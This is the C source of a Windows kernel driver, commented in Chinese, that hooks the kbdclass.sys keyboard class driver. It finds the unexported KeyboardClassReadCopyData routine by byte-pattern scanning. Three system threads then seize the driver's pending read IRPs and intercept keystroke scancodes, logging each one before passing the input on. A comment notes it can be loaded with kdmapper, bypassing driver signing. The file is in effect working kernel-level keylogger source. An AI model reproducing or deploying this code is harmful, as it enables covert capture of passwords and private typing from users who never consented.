
#include "global.h"
#include "utils.h"
#include "kbd.h"

BOOLEAN gUnloading = 0;

/*
* win32k.sys发给kbdclass.sys的IRP一次只有一个，然后等待IRP完成，
* 当KeyboardClassDequeueRead竞争到IRP后，
* PocReadCopyDataThread函数就不需要和KeyboardClassServiceCallback竞争Scancode，
* 因为此时Scancode是安全的，不会被kbdclass.sys直接写入IRP（已被我们抢到）后返回。
*/
BOOLEAN gIrpExclusive = 0;

POC_READ_FAKE_IRP_ITEM gReadFakeIrpItem = { 0 };
POC_READ_QUEUE_ITEM gReadQueueItem = { 0 };

KeyboardClassReadCopyData PocReadCopyData = NULL;

/*
* 从kbdclass.sys驱动中搜索函数KeyboardClassReadCopyData
* 特征码支持Windows 8.1 x64 - Windows 10 21H1 x64
*/
UCHAR gKeyboardClassReadCopyDataPattern[] =
{
    0x4C, 0x8B, 0xDC,
    0x49, 0x89, 0x5B, 0x08,
    0x49, 0x89, 0x6B, 0x10,
    0x49, 0x89, 0x73, 0x18,
    0x57,
    0x41, 0x54,
    0x41, 0x55,
    0x41, 0x56,
    0x41, 0x57,
    0x48, 0x83, 0xEC, 0x50,
    0xFF, 0x81, 0xB8, 0x00, 0x00, 0x00
};


NTSTATUS 
PocReadCopyDataToIrp(
    IN PCHAR DeviceExtension, 
    IN OUT PIRP Irp)
{
    ASSERT(NULL != DeviceExtension);
    ASSERT(NULL != Irp);

    if (NULL == PocReadCopyData)
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->PocReadCopyData is null.\n", __FUNCTION__));
        return STATUS_INVALID_PARAMETER;
        goto EXIT;
    }

    NTSTATUS Status = 0;

    PIRP FakeIrp = gReadFakeIrpItem.FakeIrp;
    PIO_STACK_LOCATION IrpSp = NULL, FakeIrpSp = NULL;

    ULONG MoveSize = 0;

    IrpSp = IoGetCurrentIrpStackLocation(Irp);
    FakeIrpSp = IoGetCurrentIrpStackLocation(gReadFakeIrpItem.FakeIrp);

    FakeIrpSp->Parameters.Read.Length = MAXIMUM_ITEMS_READ * sizeof(KEYBOARD_INPUT_DATA);

    FakeIrp->IoStatus.Status = PocReadCopyData(DeviceExtension, FakeIrp);

    if (0 != FakeIrp->IoStatus.Information)
    {
        MoveSize = (ULONG)((FakeIrp->IoStatus.Information <=
            MAXIMUM_ITEMS_READ * sizeof(KEYBOARD_INPUT_DATA) - Irp->IoStatus.Information) ?
            FakeIrp->IoStatus.Information :
            MAXIMUM_ITEMS_READ * sizeof(KEYBOARD_INPUT_DATA) - Irp->IoStatus.Information);

        RtlMoveMemory(
            (PCHAR)Irp->AssociatedIrp.SystemBuffer + Irp->IoStatus.Information,
            gReadFakeIrpItem.FakeIrp->AssociatedIrp.SystemBuffer,
            MoveSize);

        IrpSp->Parameters.Read.Length += MoveSize;

        Irp->IoStatus.Information += MoveSize;
        Irp->IoStatus.Status = STATUS_SUCCESS;

        if (FakeIrp->IoStatus.Information > MoveSize)
        {
            RtlMoveMemory(
                gReadFakeIrpItem.TempBuffer + gReadFakeIrpItem.KeyCount * sizeof(KEYBOARD_INPUT_DATA),
                (PCHAR)FakeIrp->AssociatedIrp.SystemBuffer + MoveSize,
                FakeIrp->IoStatus.Information - MoveSize);

            gReadFakeIrpItem.KeyCount += (ULONG)FakeIrp->IoStatus.Information - MoveSize;
        }
    }

    Status = STATUS_SUCCESS;

EXIT:

    return Status;
}


PIRP
KeyboardClassDequeueRead(
    IN PCHAR DeviceExtension
)
/*++

Routine Description:
    Dequeues the next available read irp regardless of FileObject

Assumptions:
    DeviceExtension->SpinLock is already held (so no further sync is required).

  --*/
{
    ASSERT(NULL != DeviceExtension);

    PIRP nextIrp = NULL;

    LIST_ENTRY* ReadQueue = (LIST_ENTRY*)(DeviceExtension + READ_QUEUE_OFFSET_DE);

    while (!nextIrp && !IsListEmpty(ReadQueue)) {
        PDRIVER_CANCEL oldCancelRoutine;
        PLIST_ENTRY listEntry = RemoveHeadList(ReadQueue);

        //
        // Get the next IRP off the queue and clear the cancel routine
        //
        nextIrp = CONTAINING_RECORD(listEntry, IRP, Tail.Overlay.ListEntry);
        oldCancelRoutine = IoSetCancelRoutine(nextIrp, NULL);

        //
        // IoCancelIrp() could have just been called on this IRP.
        // What we're interested in is not whether IoCancelIrp() was called
        // (ie, nextIrp->Cancel is set), but whether IoCancelIrp() called (or
        // is about to call) our cancel routine. To check that, check the result
        // of the test-and-set macro IoSetCancelRoutine.
        //
        if (oldCancelRoutine) {
            //
                //  Cancel routine not called for this IRP.  Return this IRP.
            //
            /*ASSERT(oldCancelRoutine == KeyboardClassCancel);*/
        }
        else {
            //
                // This IRP was just cancelled and the cancel routine was (or will
            // be) called. The cancel routine will complete this IRP as soon as
            // we drop the spinlock. So don't do anything with the IRP.
            //
                // Also, the cancel routine will try to dequeue the IRP, so make the
            // IRP's listEntry point to itself.
            //
            //ASSERT(nextIrp->Cancel);
            InitializeListHead(&nextIrp->Tail.Overlay.ListEntry);
            nextIrp = NULL;
        }
    }

    return nextIrp;
}


VOID 
PocDequeueReadThread(
    IN PVOID StartContext
)
/*
* 从kbdclass的IRP链表中竞争IRP
*/
{
    ASSERT(NULL != StartContext);

    PCHAR DeviceExtension = StartContext;

    NTSTATUS Status = 0;

    KIRQL Irql = { 0 };
    PKSPIN_LOCK SpinLock = (PKSPIN_LOCK)(DeviceExtension + SPIN_LOCK_OFFSET_DE);

    PIRP Irp = NULL;
    PPOC_READ_QUEUE ReadQueue = NULL;


    while (!gUnloading && NULL == Irp)
    {
        KeAcquireSpinLock(SpinLock, &Irql);
        Irp = KeyboardClassDequeueRead(DeviceExtension);
        KeReleaseSpinLock(SpinLock, Irql);

        if (NULL != Irp)
        {
            gIrpExclusive = TRUE;

            ReadQueue = ExAllocatePoolWithTag(NonPagedPool, sizeof(POC_READ_QUEUE), POC_IRP_READ_QUEUE_TAG);

            if (NULL == ReadQueue)
            {
                PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
                    ("%s->ExAllocatePoolWithTag ReadQueue failed.\n",
                        __FUNCTION__));
                Status = STATUS_INSUFFICIENT_RESOURCES;
                goto EXIT;
            }

            RtlZeroMemory(ReadQueue, sizeof(POC_READ_QUEUE));

            ReadQueue->Irp = Irp;

            ExInterlockedInsertTailList(
                &gReadQueueItem.ReadQueueHead,
                &ReadQueue->ListEntry,
                gReadQueueItem.ReadQueueSpinLock);

        }

    }

EXIT:

    PsTerminateSystemThread(Status);
}


VOID 
PocReadCopyDataThread(
    IN PVOID StartContext
)
/*
* 和KeyboardClassServiceCallback竞争从下层驱动传入的Scancode，暂存到TempBuffer中
*/
{
    ASSERT(NULL != StartContext);

    NTSTATUS Status = 0;

    if (NULL == PocReadCopyData)
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->PocReadCopyData is null.\n", __FUNCTION__));
        goto EXIT;
    }

    PCHAR DeviceExtension = StartContext;

    PIRP Irp = NULL;
    PIO_STACK_LOCATION IrpSp = NULL;
    ULONG ReadLength = 0;

    KIRQL Irql = { 0 };
    PKSPIN_LOCK SpinLock = (PKSPIN_LOCK)(DeviceExtension + SPIN_LOCK_OFFSET_DE);

    ULONG ulHundredNanoSecond = 0;
    LARGE_INTEGER Interval = { 0 };

#pragma warning(push)
#pragma warning(disable:4996)
    ulHundredNanoSecond = 10 * 1000;
    Interval = RtlConvertLongToLargeInteger(-1 * ulHundredNanoSecond);
#pragma warning(pop)

    Irp = gReadFakeIrpItem.FakeIrp;

    IrpSp = IoGetCurrentIrpStackLocation(Irp);
    ReadLength = MAXIMUM_ITEMS_READ * sizeof(KEYBOARD_INPUT_DATA);


    while (!gUnloading)
    {
        
        IrpSp->Parameters.Read.Length = ReadLength;

        KeAcquireSpinLock(SpinLock, &Irql);
        Irp->IoStatus.Status = PocReadCopyData(DeviceExtension, Irp);

        if (0 != Irp->IoStatus.Information)
        {
            if (Irp->IoStatus.Information <
                gReadFakeIrpItem.TempBufferSize - gReadFakeIrpItem.KeyCount * sizeof(KEYBOARD_INPUT_DATA))
            {
                RtlMoveMemory(
                    gReadFakeIrpItem.TempBuffer + gReadFakeIrpItem.KeyCount * sizeof(KEYBOARD_INPUT_DATA),
                    Irp->AssociatedIrp.SystemBuffer,
                    Irp->IoStatus.Information);
            }
            else
            {
                KeReleaseSpinLock(SpinLock, Irql);
                goto EXIT;
            }

            gReadFakeIrpItem.KeyCount += (ULONG)Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
        }

        KeReleaseSpinLock(SpinLock, Irql);


        if (gIrpExclusive)
        {
            Status = KeDelayExecutionThread(KernelMode, FALSE, &Interval);
        }
    }

EXIT:

    gUnloading = TRUE;
    PsTerminateSystemThread(Status);
}


VOID 
PocMoveDatatoIrpThread(
    IN PVOID StartContext
)
/*
* 将TempBuffer中的Scancode传入PocDequeueReadThread竞争的IRP中，结束并返回IRP
*/
{
    ASSERT(NULL != StartContext);

    NTSTATUS Status = 0;

    PCHAR DeviceExtension = StartContext;

    PPOC_READ_QUEUE ReadQueue = NULL;
    PLIST_ENTRY listEntry = NULL;

    PIRP Irp = NULL;
    PIO_STACK_LOCATION IrpSp = NULL;
    ULONG MoveSize = 0;

    PKSPIN_LOCK SpinLock = (PKSPIN_LOCK)(DeviceExtension + SPIN_LOCK_OFFSET_DE);
    KIRQL Irql = { 0 };

    PKEYBOARD_INPUT_DATA InputData = NULL;

    ULONG ulHundredNanoSecond = 0;
    LARGE_INTEGER Interval = { 0 };

    HANDLE ThreadHandle = NULL;


    while (!gUnloading)
    {

        if (!IsListEmpty(&gReadQueueItem.ReadQueueHead) && gReadFakeIrpItem.KeyCount > 0)
        {
            listEntry = ExInterlockedRemoveHeadList(
                &gReadQueueItem.ReadQueueHead,
                gReadQueueItem.ReadQueueSpinLock);

            ReadQueue = CONTAINING_RECORD(listEntry, POC_READ_QUEUE, ListEntry);

            Irp = ReadQueue->Irp;

            if (NULL != ReadQueue)
            {
                ExFreePoolWithTag(ReadQueue, POC_IRP_READ_QUEUE_TAG);
                ReadQueue = NULL;
            }

            if (!MmIsAddressValid(Irp))
            {
                PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
                    ("%s->Irp = %p address invaild.\n",
                        __FUNCTION__, Irp));
                goto EXIT;
            }
            else
            {
                if (STATUS_PENDING != Irp->IoStatus.Status)
                {
                    PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
                        ("%s->Irp->IoStatus.Status = 0x%x.\n",
                            __FUNCTION__, Irp->IoStatus.Status));

                    goto EXIT;
                }
            }

            IrpSp = IoGetCurrentIrpStackLocation(Irp);

            KeAcquireSpinLock(SpinLock, &Irql);

            MoveSize = (gReadFakeIrpItem.KeyCount * sizeof(KEYBOARD_INPUT_DATA) < IrpSp->Parameters.Read.Length) ?
                gReadFakeIrpItem.KeyCount * sizeof(KEYBOARD_INPUT_DATA) : IrpSp->Parameters.Read.Length;

            RtlMoveMemory(
                Irp->AssociatedIrp.SystemBuffer,
                gReadFakeIrpItem.TempBuffer,
                MoveSize);

            IrpSp->Parameters.Read.Length = MoveSize;
            Irp->IoStatus.Information = MoveSize;
            Irp->IoStatus.Status = STATUS_SUCCESS;

            gReadFakeIrpItem.KeyCount -= MoveSize / sizeof(KEYBOARD_INPUT_DATA);

            if (gReadFakeIrpItem.KeyCount > 0)
            {
                RtlMoveMemory(
                    gReadFakeIrpItem.TempBuffer,
                    gReadFakeIrpItem.TempBuffer + MoveSize,
                    gReadFakeIrpItem.KeyCount * sizeof(KEYBOARD_INPUT_DATA));
            }
            
            KeReleaseSpinLock(SpinLock, Irql);

#pragma warning(push)
#pragma warning(disable:4996)
            ulHundredNanoSecond = 200 * 1000;
            Interval = RtlConvertLongToLargeInteger(-1 * ulHundredNanoSecond);
#pragma warning(pop)

            /*
            * 多拷贝几次，防止kbdclass的缓冲区残留数据，
            * 这里基本上多循环几次，就可以不漏字符，通常可以达到四键无冲
            */
            for(ULONG i = 0; i < 2; i++)
            {
                KeAcquireSpinLock(SpinLock, &Irql);

                Status = PocReadCopyDataToIrp(DeviceExtension, Irp);

                if (!NT_SUCCESS(Status))
                {
                    PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
                        ("%s->PocReadCopyDataToIrp failed. Status = 0x%x.\n",
                            __FUNCTION__,
                            Status));
                    goto EXIT;
                }

                KeReleaseSpinLock(SpinLock, Irql);

                Status = KeDelayExecutionThread(KernelMode, FALSE, &Interval);
            }


            InputData = Irp->AssociatedIrp.SystemBuffer;

            for (ULONG i = 0; i < Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA); i++)
            {
                PocPrintScanCode(InputData);
                InputData += 1;
            }

            gIrpExclusive = FALSE;

            /*
            * IoCompleteRequest结束IRP以后，我们的驱动就有抓不到Scancode的风险，
            * 所以我们尽快的调用PocDequeueReadThread抓取IRP，并让PocReadCopyDataThread和
            * 和KeyboardClassServiceCallback竞争从下层驱动传入的Scancode，
            * 直到再次抓到IRP
            */
            Status = PsCreateSystemThread(
                &ThreadHandle,
                THREAD_ALL_ACCESS,
                NULL,
                NULL,
                NULL,
                PocDequeueReadThread,
                DeviceExtension);

            if (!NT_SUCCESS(Status))
            {
                PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
                    ("%s->PsCreateSystemThread PocDequeueReadThread failed. Status = 0x%x.\n",
                        __FUNCTION__,
                        Status));
                goto EXIT;
            }

            if (NULL != ThreadHandle)
            {
                ZwClose(ThreadHandle);
                ThreadHandle = NULL;
            }

            IoCompleteRequest(Irp, IO_KEYBOARD_INCREMENT);
        }

#pragma warning(push)
#pragma warning(disable:4996)
        ulHundredNanoSecond = 10 * 1000;
        Interval = RtlConvertLongToLargeInteger(-1 * ulHundredNanoSecond);
#pragma warning(pop)

        Status = KeDelayExecutionThread(KernelMode, FALSE, &Interval);
    }

EXIT:

    PocReadQueueCleanup();

    gUnloading = TRUE;
    PsTerminateSystemThread(Status);
}


NTSTATUS
PocDriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath
)
/*++

Routine Description:
    DriverEntry initializes the driver and is the first routine called by the
    system after the driver is loaded. DriverEntry specifies the other entry
    points in the function driver, such as EvtDevice and DriverUnload.

Parameters Description:

    DriverObject - represents the instance of the function driver that is loaded
    into memory. DriverEntry must initialize members of DriverObject before it
    returns to the caller. DriverObject is allocated by the system before the
    driver is loaded, and it is released by the system after the system unloads
    the function driver from memory.

    RegistryPath - represents the driver specific path in the Registry.
    The function driver can use the path to store driver related data between
    reboots. The path does not store hardware instance specific data.

Return Value:

    STATUS_SUCCESS if successful,
    STATUS_UNSUCCESSFUL otherwise.

--*/
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS Status = 0;

    UNICODE_STRING DeviceName = { 0 };

    PDRIVER_OBJECT driverObject = NULL;
    PDEVICE_OBJECT DeviceObject = NULL;
    PCHAR DeviceExtension = NULL;

    PCHAR TextSection = NULL;
    ULONG SectionSize = 0;

    PIO_STACK_LOCATION IrpSp = NULL;

    HANDLE ThreadHandle = NULL;

    /*
    * 使用kdmapper加载驱动时不能使用DriverObject
    */
    if (NULL != DriverObject)
    {
        DriverObject->DriverUnload = PocUnload;
    }

    /*
    * 找到键盘驱动kbdclass.sys的DeviceExtension
    */
    RtlInitUnicodeString(&DeviceName, L"\\Driver\\Kbdclass");

    Status = ObReferenceObjectByName(
        &DeviceName, 
        OBJ_CASE_INSENSITIVE, 
        NULL, 
        FILE_ALL_ACCESS, 
        *IoDriverObjectType,
        KernelMode, 
        NULL, 
        &driverObject);

    if (!NT_SUCCESS(Status))
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->ObReferenceObjectByName %ws failed. Status = 0x%x.\n", 
                __FUNCTION__, 
                DeviceName.Buffer, 
                Status));
        goto EXIT;
    }

    DeviceObject = driverObject->DeviceObject;
    DeviceExtension = DeviceObject->DeviceExtension;


    /*
    * 找到函数KeyboardClassReadCopyData的位置
    */
    TextSection = PocLookupImageSectionByName(
        ".text",
        driverObject->DriverStart,
        &SectionSize);

    if (NULL == TextSection)
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->PocLookupImageSectionByNameULONG TextSection failed.\n",
                __FUNCTION__));
        Status = STATUS_UNSUCCESSFUL;
        goto EXIT;
    }

    PocReadCopyData = (KeyboardClassReadCopyData)PocFindPattern(
        TextSection,
        SectionSize,
        (PCHAR)gKeyboardClassReadCopyDataPattern,
        sizeof(gKeyboardClassReadCopyDataPattern));

    if (NULL == PocReadCopyData)
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->PocFindPattern PocReadCopyData failed.\n",
                __FUNCTION__));
        Status = STATUS_UNSUCCESSFUL;
        goto EXIT;
    }

    PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
        ("%s->DriverStart = %p PocReadCopyData = %p DeviceExtension = %p.\n",
            __FUNCTION__,
            driverObject->DriverStart,
            PocReadCopyData,
            DeviceExtension));


    /*
    * 初始化用于抢夺kbdclass的IRP的链表
    */
    gReadQueueItem.ReadQueueSpinLock = ExAllocatePoolWithTag(
        NonPagedPool,
        sizeof(KSPIN_LOCK),
        POC_SPIN_LOCK_TAG);

    if (NULL == gReadQueueItem.ReadQueueSpinLock)
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->ExAllocatePoolWithTag ReadQueueSpinLock failed.\n",
                __FUNCTION__));
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto EXIT;
    }

    RtlZeroMemory(gReadQueueItem.ReadQueueSpinLock, sizeof(KSPIN_LOCK));

    InitializeListHead(&gReadQueueItem.ReadQueueHead);
    KeInitializeSpinLock(gReadQueueItem.ReadQueueSpinLock);


    /*
    * 初始化我们用于PocReadCopyData参数的FakeIrp和暂存Scancode的TempBuffer
    */

    gReadFakeIrpItem.FakeIrp = IoAllocateIrp(DeviceObject->StackSize, FALSE);

    if (NULL == gReadFakeIrpItem.FakeIrp)
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->IoAllocateIrp gReadFakeIrpItem.FakeIrp failed.\n",
                __FUNCTION__));
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto EXIT;
    }

    IrpSp = IoGetCurrentIrpStackLocation(gReadFakeIrpItem.FakeIrp);
    IrpSp->Parameters.Read.Length = MAXIMUM_ITEMS_READ * sizeof(KEYBOARD_INPUT_DATA);

    gReadFakeIrpItem.FakeIrp->AssociatedIrp.SystemBuffer = ExAllocatePoolWithTag(
        NonPagedPool,
        IrpSp->Parameters.Read.Length,
        POC_IRP_SYSTEMBUFFER_TAG);

    if (NULL == gReadFakeIrpItem.FakeIrp->AssociatedIrp.SystemBuffer)
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->ExAllocatePoolWithTag gReadFakeIrpItem.FakeIrp->AssociatedIrp.SystemBuffer failed.\n",
                __FUNCTION__));
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto EXIT;
    }

    RtlZeroMemory(
        gReadFakeIrpItem.FakeIrp->AssociatedIrp.SystemBuffer,
        IrpSp->Parameters.Read.Length);


    gReadFakeIrpItem.TempBufferSize = PAGE_SIZE * 10;

    gReadFakeIrpItem.TempBuffer = ExAllocatePoolWithTag(
        NonPagedPool,
        gReadFakeIrpItem.TempBufferSize,
        POC_IRP_SYSTEMBUFFER_TAG);

    if (NULL == gReadFakeIrpItem.TempBuffer)
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->ExAllocatePoolWithTag gReadFakeIrpItem.TempBuffer failed.\n",
                __FUNCTION__));
        Status = STATUS_INSUFFICIENT_RESOURCES;
        goto EXIT;
    }

    RtlZeroMemory(gReadFakeIrpItem.TempBuffer, gReadFakeIrpItem.TempBufferSize);


    /*
    * 创建三个线程，分别为
    * PocDequeueReadThread：用于从kbdclass的IRP链表中抢夺IRP；
    * PocReadCopyDataThread：用于和KeyboardClassServiceCallback竞争从下层驱动传入的Scancode，暂存到TempBuffer中；
    * PocMoveDatatoIrpThread：用于将TempBuffer中的Scancode传入PocDequeueReadThread竞争的IRP中，结束并返回IRP
    */
    Status = PsCreateSystemThread(
        &ThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        PocDequeueReadThread,
        DeviceExtension);

    if (!NT_SUCCESS(Status))
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->PsCreateSystemThread PocDequeueReadThread failed. Status = 0x%x.\n",
                __FUNCTION__,
                Status));
        goto EXIT;
    }

    if (NULL != ThreadHandle)
    {
        ZwClose(ThreadHandle);
        ThreadHandle = NULL;
    }


    Status = PsCreateSystemThread(
        &ThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        PocReadCopyDataThread,
        DeviceExtension);

    if (!NT_SUCCESS(Status))
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->PsCreateSystemThread PocReadCopyDataThread failed. Status = 0x%x.\n",
                __FUNCTION__,
                Status));
        goto EXIT;
    }

    if (NULL != ThreadHandle)
    {
        ZwClose(ThreadHandle);
        ThreadHandle = NULL;
    }


    Status = PsCreateSystemThread(
        &ThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL,
        NULL,
        PocMoveDatatoIrpThread,
        DeviceExtension);

    if (!NT_SUCCESS(Status))
    {
        PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
            ("%s->PsCreateSystemThread PocMoveDatatoIrpThread failed. Status = 0x%x.\n",
                __FUNCTION__,
                Status));
        goto EXIT;
    }

    if (NULL != ThreadHandle)
    {
        ZwClose(ThreadHandle);
        ThreadHandle = NULL;
    }


EXIT:

    if (NULL != driverObject)
    {
        ObDereferenceObject(driverObject);
        driverObject = NULL;
    }

    if (!NT_SUCCESS(Status))
    {
        PocReadQueueCleanup();
    }

    if (!NT_SUCCESS(Status) && NULL != gReadQueueItem.ReadQueueSpinLock)
    {
        ExFreePoolWithTag(gReadQueueItem.ReadQueueSpinLock, POC_SPIN_LOCK_TAG);
        gReadQueueItem.ReadQueueSpinLock = NULL;
    }

    if (!NT_SUCCESS(Status) && NULL != gReadFakeIrpItem.FakeIrp)
    {
        if (NULL != gReadFakeIrpItem.FakeIrp->AssociatedIrp.SystemBuffer)
        {
            ExFreePoolWithTag(
                gReadFakeIrpItem.FakeIrp->AssociatedIrp.SystemBuffer,
                POC_IRP_SYSTEMBUFFER_TAG);
            gReadFakeIrpItem.FakeIrp->AssociatedIrp.SystemBuffer = NULL;
        }

        IoFreeIrp(gReadFakeIrpItem.FakeIrp);
        gReadFakeIrpItem.FakeIrp = NULL;

        if (NULL != gReadFakeIrpItem.TempBuffer)
        {
            ExFreePoolWithTag(
                gReadFakeIrpItem.TempBuffer,
                POC_IRP_SYSTEMBUFFER_TAG);
            gReadFakeIrpItem.TempBuffer = NULL;
        }
    }

    return Status;
}


VOID 
PocReadQueueCleanup(
)
{
    PPOC_READ_QUEUE ReadQueue = NULL;
    PLIST_ENTRY listEntry = NULL;

    PIRP Irp = NULL;

    /*
    * IoCompleteRequest链表中的IRP，IRP不返回的话，Win32k.sys会一直等待，导致键盘失灵
    */
    while (!IsListEmpty(&gReadQueueItem.ReadQueueHead))
    {
        listEntry = ExInterlockedRemoveHeadList(
            &gReadQueueItem.ReadQueueHead,
            gReadQueueItem.ReadQueueSpinLock);

        ReadQueue = CONTAINING_RECORD(listEntry, POC_READ_QUEUE, ListEntry);

        Irp = ReadQueue->Irp;

        if (NULL != ReadQueue)
        {
            ExFreePoolWithTag(ReadQueue, POC_IRP_READ_QUEUE_TAG);
            ReadQueue = NULL;
        }

        if (!MmIsAddressValid(Irp))
        {
            PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
                ("%s->Irp = %p address invaild.\n",
                    __FUNCTION__, Irp));
            return;
        }
        else
        {
            if (STATUS_PENDING != Irp->IoStatus.Status)
            {
                PT_DBG_PRINT(PTDBG_TRACE_ROUTINES,
                    ("%s->Irp->IoStatus.Status = 0x%x.\n",
                        __FUNCTION__, Irp->IoStatus.Status));

                return;
            }
        }

        IoCompleteRequest(Irp, IO_NO_INCREMENT);
    }
}


VOID 
PocUnload(
    _In_ PDRIVER_OBJECT  DriverObject
)
{
    UNREFERENCED_PARAMETER(DriverObject);

    NTSTATUS Status = 0;

    ULONG ulHundredNanoSecond = 0;
    LARGE_INTEGER Interval = { 0 };

    gUnloading = TRUE;

#pragma warning(push)
#pragma warning(disable:4996)
    ulHundredNanoSecond = 10 * 1000 * 1000;
    Interval = RtlConvertLongToLargeInteger(-1 * ulHundredNanoSecond);
#pragma warning(pop)

    Status = KeDelayExecutionThread(KernelMode, FALSE, &Interval);

    PocReadQueueCleanup();

    if (NULL != gReadQueueItem.ReadQueueSpinLock)
    {
        ExFreePoolWithTag(gReadQueueItem.ReadQueueSpinLock, POC_SPIN_LOCK_TAG);
        gReadQueueItem.ReadQueueSpinLock = NULL;
    }

    if (NULL != gReadFakeIrpItem.FakeIrp)
    {
        if (NULL != gReadFakeIrpItem.FakeIrp->AssociatedIrp.SystemBuffer)
        {
            ExFreePoolWithTag(
                gReadFakeIrpItem.FakeIrp->AssociatedIrp.SystemBuffer,
                POC_IRP_SYSTEMBUFFER_TAG);
            gReadFakeIrpItem.FakeIrp->AssociatedIrp.SystemBuffer = NULL;
        }

        IoFreeIrp(gReadFakeIrpItem.FakeIrp);
        gReadFakeIrpItem.FakeIrp = NULL;

        if (NULL != gReadFakeIrpItem.TempBuffer)
        {
            ExFreePoolWithTag(
                gReadFakeIrpItem.TempBuffer,
                POC_IRP_SYSTEMBUFFER_TAG);
            gReadFakeIrpItem.TempBuffer = NULL;
        }
    }
}
